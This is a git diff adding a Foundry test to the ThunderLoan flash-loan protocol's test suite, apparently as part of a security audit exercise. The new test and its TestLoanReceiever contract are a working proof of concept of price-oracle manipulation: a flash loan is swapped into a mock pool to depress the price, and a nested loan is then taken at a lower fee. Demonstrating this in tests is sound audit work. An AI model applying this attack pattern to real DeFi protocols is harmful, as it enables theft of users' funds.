@@ -5,6 +5,12 @@ import { Test, console } from "forge-std/Test.sol";
 import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
 import { AssetToken } from "../../src/protocol/AssetToken.sol";
 import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
+import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
+import { BuffMockPoolFactory } from "../mocks/BuffMockPoolFactory.sol";
+import { BuffMockTSwap } from "../mocks/BuffMockTSwap.sol";
+import { ERC20Mock } from "../mocks/ERC20Mock.sol";
+import { IFlashLoanReceiver } from "src/interfaces/IFlashLoanReceiver.sol";
+import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 contract ThunderLoanTest is BaseTest {
     uint256 constant AMOUNT = 10e18;
@@ -123,13 +129,122 @@ contract ThunderLoanTest is BaseTest {
         emit log_uint(tokenA.balanceOf(liquidityProvider));
         emit log_uint(amountToRedeemInUnderlying);
 
-
-        assertEq(tokenA.balanceOf(liquidityProvider), 100030000000000000000);
+        assertEq(tokenA.balanceOf(liquidityProvider), 100_030_000_000_000_000_000);
 
         // 100030000000000000000 [1e20]
         // 1000300000000000000000
         // 1000000000000000000000
-        // 
         // assertEq(tokenA.balanceOf(address(asset)), DEPOSIT_AMOUNT - amountToRedeemInUnderlying);
+    }
+
+    function testOracleManipulation() public {
+        address tester = address(123);
+        // 1. Setup the contracts
+        //tokens
+        ERC20Mock tokenA = new ERC20Mock();
+        ERC20Mock weth = new ERC20Mock();
+        ThunderLoan thunderLoan = new ThunderLoan();
+        ERC1967Proxy proxy = new ERC1967Proxy(address(thunderLoan), "");
+        thunderLoan = ThunderLoan(address(proxy));
+        BuffMockPoolFactory poolFactory = new BuffMockPoolFactory(address(weth));
+        BuffMockTSwap tSwap = BuffMockTSwap((poolFactory.createPool(address(tokenA))));
+        thunderLoan.initialize(address(poolFactory));
+        AssetToken aToken = thunderLoan.setAllowedToken((tokenA), true);
+        console.log("aToken", address(aToken));
+
+        // 2. Set the oracle
+        //fund a TESTER
+        uint256 amount = 1000 ether;
+        tokenA.mint(tester, amount);
+        weth.mint(tester, amount);
+
+        uint256 wethToDep = 1 ether;
+        uint256 wethToDepThunder = 200 ether;
+        uint256 tokenToDepThunder = 300 ether;
+        uint256 tokenToDep = 1 ether;
+        // 1 WETH = 1 TOKEN
+
+        vm.startPrank(tester);
+        tokenA.approve(address(tSwap), type(uint256).max);
+        weth.approve(address(tSwap), type(uint256).max);
+        tokenA.approve(address(thunderLoan), type(uint256).max);
+        weth.approve(address(thunderLoan), type(uint256).max);
+
+        tSwap.deposit(wethToDep, 1, tokenToDep, block.timestamp + 1000);
+        thunderLoan.deposit(tokenA, tokenToDepThunder);
+        vm.stopPrank();
+
+        // 3. Manipulate the oracle
+        //before before attack
+        // take a flash loan
+        TestLoanReceiever testLoanReceiever =
+            new TestLoanReceiever(thunderLoan, tSwap, address(tokenA), address(weth), address(aToken));
+        tokenA.mint(address(testLoanReceiever), 7000 ether);
+        vm.startPrank(address(testLoanReceiever));
+        IERC20(tokenA).approve(address(tSwap), type(uint256).max);
+        thunderLoan.flashloan(address(testLoanReceiever), tokenA, 100 ether, "");
+        vm.stopPrank();
+
+        uint256 attackFee = testLoanReceiever.fee1() + testLoanReceiever.fee2();
+        console.log("atackFee", attackFee);
+
+        assert(attackFee < 1 ether);
+        //298603819985790278
+        //518132305114515985
+
+        //149774661992989484
+        //149803782541046960
+    }
+}
+
+contract TestLoanReceiever is IFlashLoanReceiver {
+    ThunderLoan public thunderLoan;
+    BuffMockTSwap public tSwap;
+    bool public attacked;
+    uint256 public fee1;
+    uint256 public fee2;
+    address public tokenA;
+    address public weth;
+    address public repayAddr;
+
+    constructor(ThunderLoan _thunderLoan, BuffMockTSwap _tSwap, address _tokenA, address _weth, address _repayAddr) {
+        thunderLoan = _thunderLoan;
+        tSwap = _tSwap;
+        tokenA = _tokenA;
+        weth = _weth;
+        repayAddr = _repayAddr;
+
+        uint256 feeBefore = thunderLoan.getCalculatedFee(IERC20(tokenA), 100 ether);
+        console.log("feeBefore", feeBefore);
+    }
+
+    function executeOperation(
+        address token,
+        uint256 amount,
+        uint256 fee,
+        address, /*initiator*/
+        bytes calldata /*params*/
+    )
+        external
+        override
+        returns (bool)
+    {
+        if (!attacked) {
+            attacked = true;
+            fee1 = fee;
+
+            // swap the borrowed funds for WETH tanking the price
+            // then takeout another loan and compare the fees
+            uint256 wethAmt = tSwap.getOutputAmountBasedOnInput(100 ether, 1 ether, 1 ether);
+            tSwap.swapPoolTokenForWethBasedOnInputPoolToken(100 ether, wethAmt, block.timestamp);
+
+            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
+
+            IERC20(tokenA).transfer(address(repayAddr), amount + fee1);
+        } else {
+            fee2 = fee;
+
+            IERC20(tokenA).transfer(address(repayAddr), amount + fee2);
+        }
     }
 }
